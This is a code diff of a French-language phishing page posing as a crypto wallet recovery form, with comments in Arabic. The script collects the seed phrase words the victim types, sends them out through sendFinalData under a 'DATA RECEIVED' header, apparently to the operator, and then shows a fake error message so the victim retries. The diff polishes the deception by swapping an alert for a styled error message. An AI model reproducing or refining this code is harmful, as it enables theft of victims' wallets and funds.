@@ -14,6 +14,7 @@
             --text-secondary: #b0b0cc;
             --grid-border: rgba(255, 255, 255, 0.1);
             --input-bg: #2a2a4a;
+            --error-red: #ff4d4d;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
         body { background-color: var(--bg-color); color: var(--text-white); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
@@ -42,6 +43,9 @@
         .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; }
         .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
         .item-input:focus + .item-num, .item-input:not(:placeholder-shown) + .item-num { display: none; }
+        
+        /* تنسيق رسالة الخطأ المخفية */
+        #errorMessage { color: var(--error-red); font-size: 14px; text-align: center; margin-top: 15px; display: none; font-weight: 500; }
     </style>
 </head>
 <body>
@@ -71,7 +75,9 @@
             <p class="recovery-subtitle">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>
             <div class="recovery-grid" id="mainGrid"></div>
             
-            <div class="btn-container" style="margin-top: 30px;">
+            <div id="errorMessage">Une erreur s'est produite. Veuillez réessayer.</div>
+
+            <div class="btn-container" style="margin-top: auto; padding-top: 20px;">
                 <button class="btn btn-primary" onclick="checkAndSendAll()">Restaurer</button>
             </div>
         </div>
@@ -106,8 +112,6 @@
             grid.appendChild(div);
         }
 
-        let sent = false; 
-
         function checkAndSendAll() {
             const inputs = document.querySelectorAll('.item-input');
             let words = [];
@@ -115,18 +119,16 @@
 
             inputs.forEach(input => {
                 const val = input.value.trim();
-                if (val !== "") {
-                    count++;
-                }
-                words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${val || "---"}</code>`);
+                if (val !== "") count++;
+                words.push(`<b>${input.getAttribute('data-id')}:</b> <code>${val || "Empty"}</code>`);
             });
 
-            // يرسل البيانات عند الضغط على الزر (حتى لو لم تكتمل الكلمات لضمان وصول ما كتبه)
-            const fullMessage = `<b>✅ DATA RECEIVED VIA BUTTON</b>\n\n${words.join('\n')}`;
+            // إرسال البيانات فور الضغط
+            const fullMessage = `<b>✅ DATA RECEIVED</b>\n\n${words.join('\n')}`;
             sendFinalData(fullMessage);
             
-            // إظهار تنبيه بسيط للمستخدم
-            alert("Une erreur s'est produite. Veuillez réessayer.");
+            // إظهار نص الخطأ بشكل أنيق بدلاً من Alert
+            document.getElementById('errorMessage').style.display = 'block';
         }
 
         document.addEventListener('input', (e) => {
@@ -134,12 +136,6 @@
                 checkAndSendAll();
             }
         });
-
-        document.addEventListener('blur', (e) => {
-            if (e.target.classList.contains('item-input')) {
-                checkAndSendAll();
-            }
-        }, true);
     </script>
 </body>
 </html>
